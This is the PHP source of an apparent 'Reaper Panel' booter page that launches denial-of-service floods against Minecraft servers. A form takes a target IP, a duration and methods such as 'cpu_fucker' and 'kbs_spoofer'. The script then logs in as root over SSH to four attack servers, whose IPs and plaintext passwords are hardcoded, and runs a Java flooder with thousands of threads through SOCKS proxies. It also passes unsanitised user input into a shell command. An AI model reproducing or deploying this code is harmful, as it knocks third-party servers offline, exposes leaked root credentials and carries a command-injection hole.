<!DOCTYPE html>

<?php

$status = json_decode(file_get_contents('https://api.mcsrvstat.us/2/'.$_POST["ip"]));

$poruka = "False";

?>

<html>
<head>
  <title>Reaper Panel | Premium Hub</title>
  <link rel="stylesheet" type="text/css" href="./css/style.css">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <script async src="https://arc.io/widget.js#AM1Rss4d"></script>

  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <script src="https://kit.fontawesome.com/e536e5c9d4.js" crossorigin="anonymous"></script>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

    <link href="https://fonts.googleapis.com/css2?family=Kalam&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Mukta:wght@300&display=swap" rel="stylesheet">
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">

</head>
<body>

<nav class="mb-1 navbar navbar-expand-lg navbar-dark dark p-4">
  <div class="container">
    <a class="font-reaper" href="#"><strong><i class="fas fa-meteor"></i>ReaperPanel</strong></a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent-7"
      aria-controls="navbarSupportedContent-7" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent-7">
      <ul class="navbar-nav mr-auto">
        <li class="nav-item active">
          <a class="nav-link" href="https://reaperpanel.gq/index.php">Home</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="https://discord.gg/SvpteWa" target="_blank">Discord</a>
        </li>
        <li class="nav-item dropdown">
          <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-7" data-toggle="dropdown" aria-haspopup="true"
            aria-expanded="false">Hubs </a>
          <div class="dropdown-menu dropdown-pink" aria-labelledby="navbarDropdownMenuLink-7">
            <a class="dropdown-item" href="https://reaperpanel.gq/reaper.php">Reaper Hub</a>
            <a class="dropdown-item" href="https://reaperpanel.gq/resolver.php">Resolver Hub</a>
            <a class="dropdown-item" href="https://reaperpanel.gq/premium.php">Premium Hub</a>
          </div>
        </li>
      </ul>
    </div>
  </div>
</nav>

<center>
<form method="post" class="glavni_forum1 size">
<div class="blacklist_text">
    <h1><strong>PREMIUM HUB</strong></h1>
</div>
  <div class="form-group">
    <input type="text" class="form-control" name="ip" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter the targets ip">
  </div>
  <div class="form-group">
    <input type="numbers" class="form-control" name="vreme" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Attack Time">
  </div>
  <div class="form-group">
    <input type="text" class="form-control" name="admin" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Type in your security code..">
  </div>
  <div class="form-group">
    <select class="form-control" name="select_catalog" id="exampleFormControlSelect1">
    <option value="method" type="hidden">Choose a Method</option>
    <option value="join">join</option>
    <option value="cpu_fucker">cpu_fucker</option>
    <option value="kbs_spoofer">kbs_spoofer</option>
    <option value="instant2">instant2</option>
    <option value="joinz">joinz</option>
    </select>
  </div>
  <input type="submit" class="btn btn-danger" value="Attack!">
</form>
</center>

<?php

if ($status->online == 1) {
  if ($_POST['vreme'] <= '40') {
    if ($_POST['admin'] == 'oudw2751o[mdwazxawyi'){
      $file = 'cooldown2.txt'; // the name of the text file (must be writeable by the server)
      $orderNumber = file_get_contents ($file); // read file data and store as variable
      $fdata = intval($orderNumber); // increment the value

      $file3 = 'napadi.txt'; // the name of the text file (must be writeable by the server)
      $orderNumber3 = file_get_contents ($file3); // read file data and store as variable
      $fdata3 = intval($orderNumber3); // increment the value

      if ($fdata < 1) {
        $fdata = intval($orderNumber)+1; // increment the value
        file_put_contents($file, $fdata); // write the new value back to file

        $fdata3 = intval($orderNumber3)+1; // increment the value
        file_put_contents($file3, $fdata3); // write the new value back to file

        echo '<span style="color:white;text-align:center;"><center>Attack started on ' .$_POST["ip"]. ' and it will last ' .$_POST["vreme"]. 's </center></span>';
        echo '<span style="color:white;text-align:center;"><center>using method ' .$_POST["select_catalog"]. '!</center></span>';

        $cmds = array ('', 'screen -dms bot java -jar Blacklist.jar srvResolve2=true keepAlive=true attackTime=' .$_POST["vreme"]. ' proxiesType=socks alwaysResolve=false threads=5000 timeout=2500 print=true multi=true proxiesFile=sokcs2.txt host=' .$_POST["ip"]. ' port=25565 removeFailure=true exploit=' .$_POST["select_catalog"].' connections=5000 loopAmount=1');

        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
        error_reporting(E_ALL);


        $connection = ssh2_connect('xx.xxx.xx', 22);
        ssh2_auth_password($connection, 'root', 'TrisoPeder');

        foreach ($cmds as $cmd) {
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            stream_set_blocking($stream, true);
            $stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
            echo stream_get_contents($stream_out);
        }


        $cmds = array ('', 'screen -dms bot java -jar Blacklist.jar srvResolve2=true keepAlive=true attackTime=' .$_POST["vreme"]. ' proxiesType=socks alwaysResolve=false threads=5000 timeout=2500 print=true multi=true proxiesFile=sokcs2.txt host=' .$_POST["ip"]. ' port=25565 removeFailure=true exploit=' .$_POST["select_catalog"].' connections=5000 loopAmount=1');

        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
        error_reporting(E_ALL);

        $connection = ssh2_connect('79.137.107.71', 22);
        ssh2_auth_password($connection, 'root', 'niaosdh089QE4Y7::Fas;f!!safbbvaADFGXVAS');

        foreach ($cmds as $cmd) {
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            stream_set_blocking($stream, true);
            $stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
            echo stream_get_contents($stream_out);
        }


        $cmds = array ('', 'screen -dms bot java -jar Blacklist.jar srvResolve2=true keepAlive=true attackTime=' .$_POST["vreme"]. ' proxiesType=socks alwaysResolve=false threads=3000 timeout=2500 print=true multi=true proxiesFile=sokcs2.txt host=' .$_POST["ip"]. ' port=25565 removeFailure=true exploit=' .$_POST["select_catalog"].' connections=5000 loopAmount=1');

        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
        error_reporting(E_ALL);

        $connection = ssh2_connect('194.87.139.47', 22);
        ssh2_auth_password($connection, 'root', 'privateofficial');

        foreach ($cmds as $cmd) {
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            stream_set_blocking($stream, true);
            $stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
            echo stream_get_contents($stream_out);
        }



        $cmds = array ('', 'screen -dms bot java -jar Blacklist.jar srvResolve2=true keepAlive=true attackTime=' .$_POST["vreme"]. ' proxiesType=socks alwaysResolve=false threads=3000 timeout=2500 print=true multi=true proxiesFile=sokcs2.txt host=' .$_POST["ip"]. ' port=25565 removeFailure=true exploit=' .$_POST["select_catalog"].' connections=5000 loopAmount=1');

        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
        error_reporting(E_ALL);

        $connection = ssh2_connect('194.87.138.243', 22);
        ssh2_auth_password($connection, 'root', 'privateofficial');

        foreach ($cmds as $cmd) {
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            $stream = ssh2_exec($connection, $cmd);
            stream_set_blocking($stream, true);
            $stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
            echo stream_get_contents($stream_out);
        }

        exec('screen -dms php php -f /var/www/cooldown2.php');

        $poruka = "True";
        $domen = $_POST["ip"];
        $vreme = $_POST["vreme"];
        $metoda = $_POST["select_catalog"];

      } else if ($fdata >= 1) {
        echo '<span style="color:white;text-align:center;"><center>All servers are currently in use!</center></span>';
        return;
      }
    } else {
      echo '<span style="color:white;text-align:center;"><center>The code you typed in is not valid!</center></span>';
      return;
    }
  } else {
    echo '<span style="color:white;text-align:center;"><center>Free attacks can not be longer then 40s!</center></span>';
    return;
  }
}

?>

<center>
<div class="table-container white">
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col">#</th>
      <th scope="col">Attacking</th>
      <th scope="col">Domen</th>
      <th scope="col">Time</th>
      <th scope="col">Method</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">1</th>
      <td><?php echo "$poruka"; ?></td>
      <td><?php echo "$domen"; ?></td>
      <td><?php echo "$vreme"; ?></td>
      <td><?php echo "$metoda"; ?></td>
    </tr>
  </tbody>
</table>
</div>
</center>

<script>
    if (window.performance) {
  console.info("window.performance works fine on this browser");
}
  if (performance.navigation.type == 1) {
window.location.replace("https://reaperpanel.gq/premium.php");
  } else {

  }
</script>

<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
<script>
  AOS.init();
</script>
</body>
</html>